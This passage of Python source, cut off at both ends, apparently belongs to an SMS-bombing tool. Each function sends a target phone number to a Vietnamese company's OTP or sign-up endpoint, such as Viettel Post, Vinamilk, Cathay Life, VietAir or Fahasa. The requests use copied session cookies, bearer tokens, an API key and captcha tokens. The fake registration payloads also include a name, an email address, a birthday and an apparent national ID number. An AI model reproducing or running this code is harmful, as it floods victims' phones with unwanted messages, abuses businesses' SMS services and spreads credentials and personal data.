    'x-apikey': 'X2geZ7rDEDI73K1vqwEGStqGtR90JNJ0K4sQHIrbUI3YISlv',
    'x-emp': '',
    'x-fromweb': 'true',
    'x-requestid': '9a563626-1886-40ce-a5b2-99971fd53161',
}

    json_data = {
    'Phone': phone,
    'LatOfMap': '106',
    'LongOfMap': '108',
    'Browser': '',
}

    response = requests.post('https://api.fmplus.com.vn/api/1.0/auth/verify/send-otp-v2', headers=headers, json=json_data)
def vtpost(phone):
    cookies = {
    '_gid': 'GA1.2.620335128.1720627303',
    '_gat_gtag_UA_128396571_2': '1',
    'QUIZIZZ_WS_COOKIE': 'id_192.168.12.141_15001',
    '.AspNetCore.Antiforgery.XvyenbqPRmk': 'CfDJ8ASZJlA33dJMoWx8wnezdv_KN5bT4QKXiMPZaUMqRiF_EEbvz-ub2OfOxFsWqfP5oyWQZfbAj-YmrKoW5q2we2B85fBpeffjr6w1vgncGlK11bclPhcrNb-yY6eMuSkQFZ887kHXkBgVaHZVnb06mjY',
    '_ga_9NGCREH08E': 'GS1.1.1720627303.1.0.1720627304.59.0.0',
    '_gat_gtag_UA_146347905_1': '1',
    '_gat_gtag_UA_142538724_1': '1',
    '_ga_7RZCEBC0S6': 'GS1.1.1720627304.1.1.1720627306.0.0.0',
    '_ga_WN26X24M50': 'GS1.1.1720627305.1.1.1720627306.0.0.0',
    '_ga': 'GA1.1.278441667.1720627303',
    '_ga_P86KBF64TN': 'GS1.1.1720627305.1.1.1720627319.0.0.0',
}

    headers = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Accept-Language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive',
    'Content-Type': 'application/x-www-form-urlencoded',
    # 'Cookie': '_gid=GA1.2.620335128.1720627303; _gat_gtag_UA_128396571_2=1; QUIZIZZ_WS_COOKIE=id_192.168.12.141_15001; .AspNetCore.Antiforgery.XvyenbqPRmk=CfDJ8ASZJlA33dJMoWx8wnezdv_KN5bT4QKXiMPZaUMqRiF_EEbvz-ub2OfOxFsWqfP5oyWQZfbAj-YmrKoW5q2we2B85fBpeffjr6w1vgncGlK11bclPhcrNb-yY6eMuSkQFZ887kHXkBgVaHZVnb06mjY; _ga_9NGCREH08E=GS1.1.1720627303.1.0.1720627304.59.0.0; _gat_gtag_UA_146347905_1=1; _gat_gtag_UA_142538724_1=1; _ga_7RZCEBC0S6=GS1.1.1720627304.1.1.1720627306.0.0.0; _ga_WN26X24M50=GS1.1.1720627305.1.1.1720627306.0.0.0; _ga=GA1.1.278441667.1720627303; _ga_P86KBF64TN=GS1.1.1720627305.1.1.1720627319.0.0.0',
    'Origin': 'null',
    'Pragma': 'no-cache',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-User': '?1',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
}

    data = {
    'FormRegister.FullName': 'Taylor Jasmine',
    'FormRegister.Phone': phone,
    'FormRegister.Password': 'vjyy1234',
    'FormRegister.ConfirmPassword': 'vjyy1234',
    'ReturnUrl': '/connect/authorize/callback?client_id=vtp.web&secret=vtp-web&scope=openid%20profile%20se-public-api%20offline_access&response_type=id_token%20token&state=abc&redirect_uri=https%3A%2F%2Fviettelpost.vn%2Fstart%2Flogin&nonce=s7oqj3gkapi06ddxfymrhcs',
    'ConfirmOtpType': 'Register',
    'FormRegister.IsRegisterFromPhone': 'true',
    '__RequestVerificationToken': 'CfDJ8ASZJlA33dJMoWx8wnezdv8MNiql6Angxj2aQkKc6E7R0IbTO0WlQgNkTmu1FXJfLeYLf3huG-7Bwm56zhIf_24enfQeQw_ZU0U3j7lUGSruoA3rf6J9q21R09mQjT1SH5SlPYbamWpErWJe9T5YsuQ',
}

    response = requests.post('https://id.viettelpost.vn/Account/SendOTPByPhone', cookies=cookies, headers=headers, data=data)
def shine(phone):
    headers = {
    'accept': 'application/json',
    'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'authorization': '',
    'cache-control': 'no-cache',
    'content-type': 'application/json',
    'origin': 'https://30shine.com',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://30shine.com/',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
}

    json_data = {
    'phone': phone,
}

    response = requests.post(
    'https://ls6trhs5kh.execute-api.ap-southeast-1.amazonaws.com/Prod/otp/send',
    headers=headers,
    json=json_data,
)
def dkimu(phone):
    headers = {
    'Accept': 'application/json, text/plain, */*',
    'Accept-Language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'Authorization': 'Bearer 226b116857c2788c685c66bf601222b56bdc3751b4f44b944361e84b2b1f002b',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive',
    'Content-Type': 'application/json',
    'Origin': 'https://mutosi.com',
    'Pragma': 'no-cache',
    'Referer': 'https://mutosi.com/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-site',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
}

    json_data = {
    'name': 'hà khải',
    'phone': phone,
    'password': 'Vjyy1234@',
    'confirm_password': 'Vjyy1234@',
    'firstname': None,
    'lastname': None,
    'verify_otp': 0,
    'store_token': '226b116857c2788c685c66bf601222b56bdc3751b4f44b944361e84b2b1f002b',
    'email': 'dđ@gmail.com',
    'birthday': '2006-02-13',
    'accept_the_terms': 1,
    'receive_promotion': 1,
}

    response = requests.post('https://api-omni.mutosi.com/client/auth/register', headers=headers, json=json_data)
def otpmu(phone):
    headers = {
    'Accept': 'application/json, text/plain, */*',
    'Accept-Language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'Authorization': 'Bearer 226b116857c2788c685c66bf601222b56bdc3751b4f44b944361e84b2b1f002b',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive',
    'Content-Type': 'application/json',
    'Origin': 'https://mutosi.com',
    'Pragma': 'no-cache',
    'Referer': 'https://mutosi.com/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-site',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
}

    json_data = {
    'phone': phone,
    'token': '03AFcWeA4O6j16gs8gKD9Zvb-gkvoC-kBTVH1xtMZrMmjfODRDkXlTkAzqS6z0cT_96PI4W-sLoELf2xrLnCpN0YvCs3q90pa8Hq52u2dIqknP5o7ZY-5isVxiouDyBbtPsQEzaVdXm0KXmAYPn0K-wy1rKYSAQWm96AVyKwsoAlFoWpgFeTHt_-J8cGBmpWcVcmOPg-D4-EirZ5J1cAGs6UtmKW9PkVZRHHwqX-tIv59digmt-KuxGcytzrCiuGqv6Rk8H52tiVzyNTtQRg6JmLpxe7VCfXEqJarPiR15tcxoo1RamCtFMkwesLd39wHBDHxoyiUah0P4NLbqHU1KYISeKbGiuZKB2baetxWItDkfZ5RCWIt5vcXXeF0TF7EkTQt635L7r1wc4O4p1I-vwapHFcBoWSStMOdjQPIokkGGo9EE-APAfAtWQjZXc4H7W3Aaj0mTLpRpZBV0TE9BssughbVXkj5JtekaSOrjrqnU0tKeNOnGv25iCg11IplsxBSr846YvJxIJqhTvoY6qbpFZymJgFe53vwtJhRktA3jGEkCFRdpFmtw6IMbfgaFxGsrMb2wkl6armSvVyxx9YKRYkwNCezXzRghV8ZtLHzKwbFgA6ESFRoIHwDIRuup4Da2Bxq4f2351XamwzEQnha6ekDE2GJbTw',
    'source': 'web_consumers',
}

    response = requests.post('https://api-omni.mutosi.com/client/auth/reset-password/send-phone', headers=headers, json=json_data)
def cathay(phone):
    cookies = {
    'JSESSIONID': 'u2hdrUGJED2stIM8swVv869b.06283f0e-f7d1-36ef-bc27-6779aba32e74',
    'TS01f67c5d': '0110512fd710ada119e103677eeb3323b3f9f6d76d703659f4f9cec6727f9fee620c26622e56af64415bb05bfe185fdead4be1a598',
    'BIGipServerB2C_http': '!zsGhGGj3s8sTbk4R4wuMnLjIghcvhuqi/7WpJSvUzgE9Sc3xf70c/K1xMYAaa5MS3Ic/svEyImCoUg==',
    'TS0173f952': '0110512fd710ada119e103677eeb3323b3f9f6d76d703659f4f9cec6727f9fee620c26622e56af64415bb05bfe185fdead4be1a598',
    '_ga': 'GA1.3.1657492692.1720889869',
    '_gid': 'GA1.3.636332226.1720889871',
    'INITSESSIONID': '3f1d8cc9b54babdfc46573d45f59224f',
    '_ga_M0ZP5CJBQZ': 'GS1.1.1720889868.1.0.1720889887.0.0.0',
}

    headers = {
    'Accept': 'application/json, text/javascript, */*; q=0.01',
    'Accept-Language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'Cookie': 'JSESSIONID=u2hdrUGJED2stIM8swVv869b.06283f0e-f7d1-36ef-bc27-6779aba32e74; TS01f67c5d=0110512fd710ada119e103677eeb3323b3f9f6d76d703659f4f9cec6727f9fee620c26622e56af64415bb05bfe185fdead4be1a598; BIGipServerB2C_http=!zsGhGGj3s8sTbk4R4wuMnLjIghcvhuqi/7WpJSvUzgE9Sc3xf70c/K1xMYAaa5MS3Ic/svEyImCoUg==; TS0173f952=0110512fd710ada119e103677eeb3323b3f9f6d76d703659f4f9cec6727f9fee620c26622e56af64415bb05bfe185fdead4be1a598; _ga=GA1.3.1657492692.1720889869; _gid=GA1.3.636332226.1720889871; INITSESSIONID=3f1d8cc9b54babdfc46573d45f59224f; _ga_M0ZP5CJBQZ=GS1.1.1720889868.1.0.1720889887.0.0.0',
    'Origin': 'https://www.cathaylife.com.vn',
    'Pragma': 'no-cache',
    'Referer': 'https://www.cathaylife.com.vn/CPWeb/html/CP/Z1/CPZ1_0100/CPZ10110.html',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    'X-Requested-With': 'XMLHttpRequest',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
}

    data = {
    'memberMap': '{"userName":"trongkhai611@gmail.com","password":"ditmetzk","birthday":"19/07/1988","certificateNumber":"001088647384","phone":"' + phone + '","email":"trongkhai611@gmail.com","LINK_FROM":"signUp2","memberID":"","CUSTOMER_NAME":"NGUYỄN HUY HOÀNG"}',
    'OTP_TYPE': 'P',
    'LANGS': 'vi_VN',
}


    response = requests.post(
    'https://www.cathaylife.com.vn/CPWeb/servlet/HttpDispatcher/CPZ1_0110/reSendOTP',
    cookies=cookies,
    headers=headers,
    data=data,
)
def vina(phone):
    cookies = {
    '_gcl_au': '1.1.998139933.1720624574',
    '_ga': 'GA1.1.50287730.1720624578',
    '_fbp': 'fb.2.1720624579398.521085014509551541',
    '_tt_enable_cookie': '1',
    '_ttp': 'KSqjH4dgnlCZCXFrW8iH9-PBbVv',
    '_gcl_gs': '2.1.k1$i1720624593',
    '_gcl_aw': 'GCL.1720624597.CjwKCAjw4ri0BhAvEiwA8oo6F2TkUVdatYI4tVOobGswn40OdeGgXIg6LXx5FNTWp7uUoRTyudcm1hoCI04QAvD_BwE',
    '_hjSessionUser_2067180': 'eyJpZCI6IjdhM2IwZGI1LTAyYzUtNTk0YS1hYWIxLTUxNGFhMjEzYmMwNyIsImNyZWF0ZWQiOjE3MjA2MjQ1Nzk1NjAsImV4aXN0aW5nIjp0cnVlfQ==',
    'ci_session': 'a%3A5%3A%7Bs%3A10%3A%22session_id%22%3Bs%3A32%3A%223d8858bedb9f88174683e7216ae7f4de%22%3Bs%3A10%3A%22ip_address%22%3Bs%3A11%3A%22172.20.10.5%22%3Bs%3A10%3A%22user_agent%22%3Bs%3A111%3A%22Mozilla%2F5.0+%28Windows+NT+10.0%3B+Win64%3B+x64%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Chrome%2F126.0.0.0+Safari%2F537.36%22%3Bs%3A13%3A%22last_activity%22%3Bi%3A1721111592%3Bs%3A9%3A%22user_data%22%3Bs%3A0%3A%22%22%3B%7D5be85c0c1450958dd4ed204579b830aa',
    '_hjSession_2067180': 'eyJpZCI6IjJiMDkwNzRmLTA2M2YtNDNkOC1hYzljLTk1ZTM4MDU3ODA5NSIsImMiOjE3MjExMTE1OTU0NzgsInMiOjAsInIiOjAsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjowLCJzcCI6MX0=',
    '_clck': '1sxln5m%7C2%7Cfni%7C0%7C1652',
    '__cf_bm': 'lBreB9n2Kjxr5GDN12Z6cP1PU2TCNww1w8ccXp5bzus-1721111653-1.0.1.1-tG3rISwY9rhAXjyBqH8rYZTCWOA9POhBSf1D0X0bFyRdMUnR9K7cmCgu05Xxiho3.bxM00TNCyc6lQ8OcpEhcA',
    'builderSessionId': '7b564e5635c64aa4b60d611b650e05b4',
    'sca_fg_codes': '[]',
    'avadaIsLogin': '',
    '_ga_6NH1HJ4MRS': 'GS1.1.1721111594.2.1.1721111671.44.0.0',
    '_clsk': '1q6ggsm%7C1721111672278%7C4%7C1%7Cv.clarity.ms%2Fcollect',
}

    headers = {
    'accept': '*/*',
    'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'authorization': 'Bearer null',
    'cache-control': 'no-cache',
    'content-type': 'text/plain;charset=UTF-8',
    # 'cookie': '_gcl_au=1.1.998139933.1720624574; _ga=GA1.1.50287730.1720624578; _fbp=fb.2.1720624579398.521085014509551541; _tt_enable_cookie=1; _ttp=KSqjH4dgnlCZCXFrW8iH9-PBbVv; _gcl_gs=2.1.k1$i1720624593; _gcl_aw=GCL.1720624597.CjwKCAjw4ri0BhAvEiwA8oo6F2TkUVdatYI4tVOobGswn40OdeGgXIg6LXx5FNTWp7uUoRTyudcm1hoCI04QAvD_BwE; _hjSessionUser_2067180=eyJpZCI6IjdhM2IwZGI1LTAyYzUtNTk0YS1hYWIxLTUxNGFhMjEzYmMwNyIsImNyZWF0ZWQiOjE3MjA2MjQ1Nzk1NjAsImV4aXN0aW5nIjp0cnVlfQ==; ci_session=a%3A5%3A%7Bs%3A10%3A%22session_id%22%3Bs%3A32%3A%223d8858bedb9f88174683e7216ae7f4de%22%3Bs%3A10%3A%22ip_address%22%3Bs%3A11%3A%22172.20.10.5%22%3Bs%3A10%3A%22user_agent%22%3Bs%3A111%3A%22Mozilla%2F5.0+%28Windows+NT+10.0%3B+Win64%3B+x64%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Chrome%2F126.0.0.0+Safari%2F537.36%22%3Bs%3A13%3A%22last_activity%22%3Bi%3A1721111592%3Bs%3A9%3A%22user_data%22%3Bs%3A0%3A%22%22%3B%7D5be85c0c1450958dd4ed204579b830aa; _hjSession_2067180=eyJpZCI6IjJiMDkwNzRmLTA2M2YtNDNkOC1hYzljLTk1ZTM4MDU3ODA5NSIsImMiOjE3MjExMTE1OTU0NzgsInMiOjAsInIiOjAsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjowLCJzcCI6MX0=; _clck=1sxln5m%7C2%7Cfni%7C0%7C1652; __cf_bm=lBreB9n2Kjxr5GDN12Z6cP1PU2TCNww1w8ccXp5bzus-1721111653-1.0.1.1-tG3rISwY9rhAXjyBqH8rYZTCWOA9POhBSf1D0X0bFyRdMUnR9K7cmCgu05Xxiho3.bxM00TNCyc6lQ8OcpEhcA; builderSessionId=7b564e5635c64aa4b60d611b650e05b4; sca_fg_codes=[]; avadaIsLogin=; _ga_6NH1HJ4MRS=GS1.1.1721111594.2.1.1721111671.44.0.0; _clsk=1q6ggsm%7C1721111672278%7C4%7C1%7Cv.clarity.ms%2Fcollect',
    'origin': 'https://new.vinamilk.com.vn',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://new.vinamilk.com.vn/account/register',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
}

    data = '{"type":"register","phone":"' + phone + '"}'

    response = requests.post('https://new.vinamilk.com.vn/api/account/getotp', cookies=cookies, headers=headers, data=data)
def air(phone):
    referer_url = f'https://vietair.com.vn/khach-hang-than-quen/xac-nhan-otp-dang-ky?sq_id=30149&mobile={phone}'

    cookies = {
        '_gcl_au': '1.1.515899722.1720625176',
        '_tt_enable_cookie': '1',
        '_ttp': 't-FL-whNfDCNGHd27aF7syOqRSh',
        '_fbp': 'fb.2.1720625180842.882992170348492798',
        '__zi': '3000.SSZzejyD3jSkdkgYo5SCqJ6U_wE7LLZFVv3duDj7Kj1jqlNsoWH8boBGzBYF0KELBTUwk8y31v8gtBUuYWuBa0.1',
        '_gid': 'GA1.3.1511312052.1721112193',
        '_clck': '1eg7brl%7C2%7Cfni%7C0%7C1652',
        '_ga': 'GA1.1.186819165.1720625180',
        '_ga_R4WM78RL0C': 'GS1.1.1721112192.2.1.1721112216.36.0.0',
    }

    headers = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'cache-control': 'no-cache',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://vietair.com.vn',
        'pragma': 'no-cache',
        'priority': 'u=1, i',
        'referer': referer_url,
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'op': 'PACKAGE_HTTP_POST',
        'path_ajax_post': '/service03/sms/get',
        'package_name': 'PK_FD_SMS_OTP',
        'object_name': 'INS',
        'P_MOBILE': phone,
        'P_TYPE_ACTIVE_CODE': 'DANG_KY_NHAN_OTP',
    }

    response = requests.post('https://vietair.com.vn/Handler/CoreHandler.ashx', cookies=cookies, headers=headers, data=data)
def fa(phone):
    cookies = {
    'frontend': '2c83545216a746a78e9359eb6ed27b3d',
    '_ga': 'GA1.1.4630769.1721136088',
    '_gcl_au': '1.1.1971610675.1721136089',
    'frontend_cid': 'zNYnI9BV3h9Li12T',
    '_tt_enable_cookie': '1',
    '_ttp': 'yK0_Sao-5lepXIRR39-6N_UcfI2',
    '_fbp': 'fb.1.1721136099403.449285731186677163',
    '_clck': '1n4uxir%7C2%7Cfni%7C0%7C1658',
    'moe_uuid': '3aa3f66c-847f-4fcc-988c-f4d857f0a073',
    'USER_DATA': '%7B%22attributes%22%3A%5B%5D%2C%22subscribedToOldSdk%22%3Afalse%2C%22deviceUuid%22%3A%223aa3f66c-847f-4fcc-988c-f4d857f0a073%22%2C%22deviceAdded%22%3Atrue%7D',
    'SOFT_ASK_STATUS': '%7B%22actualValue%22%3A%22not%20shown%22%2C%22MOE_DATA_TYPE%22%3A%22string%22%7D',
    'OPT_IN_SHOWN_TIME': '1721136125365',
    'HARD_ASK_STATUS': '%7B%22actualValue%22%3A%22dismissed%22%2C%22MOE_DATA_TYPE%22%3A%22string%22%7D',
    '_clsk': '169oz62%7C1721136183839%7C3%7C1%7Cv.clarity.ms%2Fcollect',
    'SESSION': '%7B%22sessionKey%22%3A%223579222f-fe73-4c43-93d9-21152f0de1a8%22%2C%22sessionStartTime%22%3A%222024-07-16T13%3A21%3A45.728Z%22%2C%22sessionMaxTime%22%3A1800%2C%22customIdentifiersToTrack%22%3A%5B%5D%2C%22sessionExpiryTime%22%3A1721137985887%2C%22numberOfSessions%22%3A1%7D',
    '_ga_460L9JMC2G': 'GS1.1.1721136088.1.1.1721136245.60.0.1919128255',
}

    headers = {
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': 'frontend=2c83545216a746a78e9359eb6ed27b3d; _ga=GA1.1.4630769.1721136088; _gcl_au=1.1.1971610675.1721136089; frontend_cid=zNYnI9BV3h9Li12T; _tt_enable_cookie=1; _ttp=yK0_Sao-5lepXIRR39-6N_UcfI2; _fbp=fb.1.1721136099403.449285731186677163; _clck=1n4uxir%7C2%7Cfni%7C0%7C1658; moe_uuid=3aa3f66c-847f-4fcc-988c-f4d857f0a073; USER_DATA=%7B%22attributes%22%3A%5B%5D%2C%22subscribedToOldSdk%22%3Afalse%2C%22deviceUuid%22%3A%223aa3f66c-847f-4fcc-988c-f4d857f0a073%22%2C%22deviceAdded%22%3Atrue%7D; SOFT_ASK_STATUS=%7B%22actualValue%22%3A%22not%20shown%22%2C%22MOE_DATA_TYPE%22%3A%22string%22%7D; OPT_IN_SHOWN_TIME=1721136125365; HARD_ASK_STATUS=%7B%22actualValue%22%3A%22dismissed%22%2C%22MOE_DATA_TYPE%22%3A%22string%22%7D; _clsk=169oz62%7C1721136183839%7C3%7C1%7Cv.clarity.ms%2Fcollect; SESSION=%7B%22sessionKey%22%3A%223579222f-fe73-4c43-93d9-21152f0de1a8%22%2C%22sessionStartTime%22%3A%222024-07-16T13%3A21%3A45.728Z%22%2C%22sessionMaxTime%22%3A1800%2C%22customIdentifiersToTrack%22%3A%5B%5D%2C%22sessionExpiryTime%22%3A1721137985887%2C%22numberOfSessions%22%3A1%7D; _ga_460L9JMC2G=GS1.1.1721136088.1.1.1721136245.60.0.1919128255',
    'origin': 'https://www.fahasa.com',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://www.fahasa.com/customer/account/login/referer/aHR0cHM6Ly93d3cuZmFoYXNhLmNvbS9jdXN0b21lci9hY2NvdW50L2luZGV4Lw,,/',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'traceparent': '00-13c9c10c4d525aad8d0528fa3b7fd940-866a99283e198658-01',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}

    data = {
    'phone': phone,
}

    response = requests.post('https://www.fahasa.com/ajaxlogin/ajax/checkPhone', cookies=cookies, headers=headers, data=data)
def sapo(phone):
    cookies = {
    '_hjSessionUser_3167213': 'eyJpZCI6IjZlZWEzMDY1LTI2ZTctNTg4OC1hY2YyLTBmODQwYmY4OGYyMyIsImNyZWF0ZWQiOjE3MjExMzYxMDU4NDIsImV4aXN0aW5nIjp0cnVlfQ==',
    '_hjSession_3167213': 'eyJpZCI6IjMxN2QxMGYwLTE1ZDEtNDA3Yi1iM2YwLWY2YzQyNGYwOGZkYSIsImMiOjE3MjExMzYxMDU4NDUsInMiOjEsInIiOjEsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjoxLCJzcCI6MH0=',
    '_gid': 'GA1.2.312311746.1721136107',
    '_fbp': 'fb.1.1721136112829.278874665245209803',
    '_ce.irv': 'new',
    'cebs': '1',
    '_ce.clock_event': '1',
    '_ce.clock_data': '-24%2C1.54.177.179%2C1%2Cf1f6b29a6cc1f79a0fea05b885aa33d0%2CChrome%2CVN',
    'G_ENABLED_IDPS': 'google',
    'source': 'https://www.sapo.vn/dang-nhap-kenh-ban-hang.html',
    'lang': 'vi',
    'referral': 'https://accounts.sapo.vn/',
    'landing_page': 'https://www.sapo.vn/dang-nhap-kenh-ban-hang.html',
    'start_time': '07/16/2024 20:50:23',
    '_dc_gtm_UA-66880228-3': '1',
    'pageview': '2',
    '_ga_4NX0F91DEX': 'GS1.2.1721136112.1.1.1721137827.0.0.0',
    'cebsp_': '8',
    '_dc_gtm_UA-66880228-1': '1',
    '_gat_UA-239546923-1': '1',
    '_ga_YNVPPJ8MZP': 'GS1.1.1721136164.1.1.1721137832.50.0.0',
    '_ga': 'GA1.1.1203051188.1721136107',
    '_ga_GECRBQV6JK': 'GS1.1.1721136164.1.1.1721137833.49.0.0',
    '_ga_8956TVT2M3': 'GS1.1.1721136165.1.1.1721137833.49.0.0',
    '_ga_HXMGB9WRVX': 'GS1.1.1721136159.1.1.1721137833.60.0.0',
    '_ga_CDD1S5P7D4': 'GS1.1.1721136165.1.1.1721137833.49.0.0',
    '_ga_Y9YZPDEGP0': 'GS1.1.1721136163.1.1.1721137833.49.0.0',
    '_ga_EBZKH8C7MK': 'GS1.2.1721136166.1.1.1721137833.0.0.0',
    '_ga_P9DPF3E00F': 'GS1.1.1721136112.1.1.1721137846.0.0.0',
    '_ga_8Z6MB85ZM2': 'GS1.1.1721136165.1.1.1721137847.35.0.0',
    '_ce.s': 'v~a9bf0cd0d29c960e5bff8890efefc88e208d7385~lcw~1721137874051~lva~1721136168617~vpv~0~v11.fhb~1721136169125~v11.lhb~1721137827515~v11.cs~200798~v11.s~7f389030-4376-11ef-8b30-7911946dbf22~v11.sla~1721137874457~lcw~1721137874457',
    '_gcl_au': '1.1.1947486191.1721136104.1373278243.1721136556.1721137874',
}

    headers = {
    'accept': '*/*',
    'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': '_hjSessionUser_3167213=eyJpZCI6IjZlZWEzMDY1LTI2ZTctNTg4OC1hY2YyLTBmODQwYmY4OGYyMyIsImNyZWF0ZWQiOjE3MjExMzYxMDU4NDIsImV4aXN0aW5nIjp0cnVlfQ==; _hjSession_3167213=eyJpZCI6IjMxN2QxMGYwLTE1ZDEtNDA3Yi1iM2YwLWY2YzQyNGYwOGZkYSIsImMiOjE3MjExMzYxMDU4NDUsInMiOjEsInIiOjEsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjoxLCJzcCI6MH0=; _gid=GA1.2.312311746.1721136107; _fbp=fb.1.1721136112829.278874665245209803; _ce.irv=new; cebs=1; _ce.clock_event=1; _ce.clock_data=-24%2C1.54.177.179%2C1%2Cf1f6b29a6cc1f79a0fea05b885aa33d0%2CChrome%2CVN; G_ENABLED_IDPS=google; source=https://www.sapo.vn/dang-nhap-kenh-ban-hang.html; lang=vi; referral=https://accounts.sapo.vn/; landing_page=https://www.sapo.vn/dang-nhap-kenh-ban-hang.html; start_time=07/16/2024 20:50:23; _dc_gtm_UA-66880228-3=1; pageview=2; _ga_4NX0F91DEX=GS1.2.1721136112.1.1.1721137827.0.0.0; cebsp_=8; _dc_gtm_UA-66880228-1=1; _gat_UA-239546923-1=1; _ga_YNVPPJ8MZP=GS1.1.1721136164.1.1.1721137832.50.0.0; _ga=GA1.1.1203051188.1721136107; _ga_GECRBQV6JK=GS1.1.1721136164.1.1.1721137833.49.0.0; _ga_8956TVT2M3=GS1.1.1721136165.1.1.1721137833.49.0.0; 